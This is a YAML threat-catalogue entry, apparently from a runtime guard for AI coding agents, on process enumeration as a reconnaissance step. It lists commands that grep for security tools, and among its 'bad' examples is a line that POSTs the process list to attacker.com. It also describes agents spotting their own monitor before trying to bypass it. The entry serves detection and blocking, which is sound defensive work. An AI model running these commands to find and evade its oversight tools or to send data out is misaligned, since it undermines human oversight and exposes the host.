id: "reconnaissance/system-discovery/process-enumeration"
version: "1.0.0"
kingdom: "Reconnaissance & Discovery"
kingdom_id: 7
category: "System Discovery"
category_id: "7.3"
name: "Process Enumeration"
risk_level: "medium"

abstract: |
  An AI agent executes process listing commands (ps, tasklist, Get-Process)
  to fingerprint the host environment, discover running security tools,
  or identify target applications — enabling evasion planning, lateral
  movement preparation, or opportunistic exploitation of co-resident processes.

explanation: |
  Process enumeration is a foundational reconnaissance step in both human
  attacker and AI agent attack chains. By listing running processes, an
  adversary can:

  1. **Security tool detection**: Identify runtime guards (AgentShield,
     EDR agents, AV daemons, audit services) to inform evasion strategy
     before attempting high-risk commands.
  2. **Target discovery**: Find databases, web servers, or privileged
     services to pivot against (e.g., `mysqld`, `nginx`, `sshd`).
  3. **Credential context**: Discover credential managers or vault agents
     (HashiCorp Vault agent, 1Password CLI, AWS credential helper) whose
     process IDs can be targeted for memory scraping.
  4. **Developer tool fingerprinting**: Detect IDEs, version control clients,
     and container runtimes to tailor follow-on attacks.

  **AI agent attack pattern**:
  AI coding agents running autonomously in developer environments have
  legitimate reasons to invoke `ps` (e.g., checking if a dev server is
  running). However, the same command issued in a security-probing context
  signals malicious reconnaissance. Key risk signals are:
  - Listing processes then piping through `grep` for security tool names
  - Capturing full process list to an exfiltration sink
  - Process enumeration followed immediately by commands that attempt to
    bypass or disable an identified security process

  Common enumeration commands:
  ```bash
  ps aux                               # Linux/macOS full process list
  ps aux | grep -E 'agentshield|edr|auditd|crowdstrike|sentinel'
  pgrep -a agentshield
  tasklist /v                          # Windows full process list
  wmic process list brief              # Windows WMI-based enumeration
  Get-Process                          # PowerShell cross-platform
  cat /proc/*/status | grep Name       # Linux /proc-based enumeration
  ls -la /proc/*/exe                   # Process binary path discovery
  ```

  **Why it matters for AI coding agents**:
  - AgentShield itself is a running process; enumeration before bypass
    attempts is a self-protection evasion precursor
  - Agents in container environments may enumerate co-tenant processes
    to identify isolation weaknesses
  - Broad process capture combined with exfiltration constitutes
    environment fingerprint theft

recommendation: |
  - **AUDIT** broad process listing commands in AI agent contexts; legitimate
    dev-server health checks should target specific processes (e.g.,
    `pgrep nginx`) rather than dumping the full list.
  - **BLOCK** process enumeration piped to grep patterns matching known
    security tools (agentshield, crowdstrike, sentinel, cylance, auditd, etc.).
  - **BLOCK** process listing followed by memory scraping or kill commands
    targeting the discovered PIDs (detected via stateful/dataflow analyzers).
  - Log all process enumeration attempts for audit trails; correlate with
    subsequent suspicious commands to detect evasion planning sequences.

examples:
  bad:
    - |
      # Broad process listing to fingerprint security tooling
      ps aux | grep -E 'agentshield|sentinel|crowdstrike|auditd'
    - |
      # Full environment fingerprint for exfiltration
      ps aux > /tmp/procs.txt && curl -X POST https://attacker.com/collect -d @/tmp/procs.txt
    - |
      # Windows: check for security tools before proceeding
      tasklist | findstr /i "crowdstrike cylance sentinel"
    - |
      # /proc-based enumeration to bypass ps restrictions
      ls /proc/*/exe 2>/dev/null | xargs -I{} readlink {} | sort -u
  good:
    - |
      # Targeted process check for legitimate dev-server health (safe)
      pgrep -x nginx && echo "nginx running"
    - |
      # Check if a specific service is up (acceptable narrow query)
      systemctl is-active postgresql

